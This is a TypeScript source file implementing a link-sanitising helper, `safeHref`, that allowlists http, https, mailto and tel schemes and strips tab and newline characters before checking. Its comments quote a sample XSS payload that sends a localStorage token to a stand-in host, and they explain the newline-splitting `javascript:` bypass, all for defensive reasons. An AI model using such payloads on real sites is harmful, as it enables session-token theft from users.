/**
 * What a link is allowed to point at.
 *
 * ## Why a primitive has to care
 *
 * `href` looks like a display concern, and in an app whose links are written by its own developers
 * it is one. WE's are not: a link's target comes from a template, which is data, and from a record,
 * which syncs in from whoever wrote it. `href="javascript:fetch('//x/'+localStorage.token)"` is
 * script execution in the app's own origin, one click away, from anybody who can write a string
 * anywhere it is rendered — a post body, a profile field, a space description.
 *
 * The check belongs here rather than in each caller for the ordinary reason: there is one `<a>` per
 * primitive and dozens of places that render one, so a rule enforced at the call sites is a rule
 * that holds until somebody adds the next call site.
 *
 * ## What is allowed
 *
 * Four schemes that navigate or hand off to another app, and anything with no scheme at all —
 * relative paths, absolute paths and fragments, which cannot change protocol and are how a template
 * links within the app.
 *
 * `data:` is not among them: a `data:text/html` link opens attacker-authored HTML that older
 * browsers ran in the opener's origin, and there is no case for one in a link a user clicks.
 * `blob:` likewise. Anything unrecognised — `file:`, an OS scheme, a custom protocol some other
 * installed app registered — is refused rather than passed through, for the same reason the CSS
 * sanitiser refuses unknown at-rules: an allowlist is the only version of this that stays correct.
 */
const SAFE_SCHEMES = new Set(['http:', 'https:', 'mailto:', 'tel:']);

/**
 * Tab, newline and carriage return, which a URL parser strips *before* reading the scheme.
 *
 * This is the bypass that makes a naive `startsWith('javascript:')` check useless: `java\nscript:`
 * does not look like a scheme to a regex, so a checker skips it as a relative URL — and the browser
 * then removes the newline and runs it. Stripping them first means the string tested is the string
 * navigated to.
 */
const URL_IGNORED = /[\t\n\r]/g;

/**
 * The href to render, or `''` for one that would not be safe to click.
 *
 * Returns the empty string rather than throwing or leaving the original: an `<a>` with no usable
 * href is inert and still reads as a link, which is the honest rendering of a link that points
 * somewhere it is not allowed to go.
 */
export function safeHref(href: string | undefined): string {
  if (!href) return '';

  const cleaned = href.replace(URL_IGNORED, '').trim();
  if (!cleaned) return '';

  // No scheme means relative, absolute-path or fragment — nothing that can switch protocol.
  if (!/^[a-z][a-z0-9+.-]*:/i.test(cleaned)) return cleaned;

  try {
    // The base matters only for parsing; a scheme-bearing URL ignores it.
    return SAFE_SCHEMES.has(new URL(cleaned, 'https://we.invalid/').protocol) ? cleaned : '';
  } catch {
    return '';
  }
}
